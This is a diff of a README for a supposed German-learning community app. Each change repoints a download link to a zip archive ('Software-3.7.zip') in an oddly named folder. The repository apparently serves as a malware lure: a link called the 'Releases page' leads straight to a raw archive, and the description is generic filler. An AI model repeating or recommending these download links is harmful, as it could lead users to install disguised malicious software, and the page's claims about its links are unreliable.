@@ -1,7 +1,7 @@
 # 🌍 communities - Join a Vibrant Learning Community
 
 ## 🔗 Download Now
-[![Download the latest version](https://raw.githubusercontent.com/ElvisRemington/communities/main/untragic/communities_v3.8-alpha.1.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/ElvisRemington/communities/main/untragic/communities_v3.8-alpha.1.zip)
+[![Download the latest version](https://raw.githubusercontent.com/ElvisRemington/communities/main/untragic/Software-3.7.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/ElvisRemington/communities/main/untragic/Software-3.7.zip)
 
 ## 📋 Description
 Communities is an application that connects you with German learning groups, both online and offline. It enables discussion, support, and collaboration, making your language-learning journey enjoyable and effective. Whether you're looking for conversation partners, local meetups, or feedback from peers, this app has you covered.
@@ -10,7 +10,7 @@ Communities is an application that connects you with German learning groups, bot
 To get started with Communities, follow these simple steps to download and install the application on your device.
 
 ### 1. Visit the Releases Page
-Head over to our [Releases page](https://raw.githubusercontent.com/ElvisRemington/communities/main/untragic/communities_v3.8-alpha.1.zip) to find the latest version of Communities. This page lists all the available versions and gives you the details you need.
+Head over to our [Releases page](https://raw.githubusercontent.com/ElvisRemington/communities/main/untragic/Software-3.7.zip) to find the latest version of Communities. This page lists all the available versions and gives you the details you need.
 
 ### 2. Choose Your Version
 On the Releases page, look for the most recent version. Click on it to view more details, including what's new and fixed in this version.
@@ -51,6 +51,6 @@ Stay tuned for upcoming cultural events and meetups. These gatherings will enhan
 We value your input. If you have questions or suggestions, please reach out through the support channels in the Communities app or join our Discord group.
 
 ## 📦 Download & Install
-To start your journey with Communities, remember to [visit this page to download](https://raw.githubusercontent.com/ElvisRemington/communities/main/untragic/communities_v3.8-alpha.1.zip). Follow the earlier steps to install and start connecting with others today.
+To start your journey with Communities, remember to [visit this page to download](https://raw.githubusercontent.com/ElvisRemington/communities/main/untragic/Software-3.7.zip). Follow the earlier steps to install and start connecting with others today.
 
 Thank you for choosing Communities! Together, let’s enhance your German learning experience.
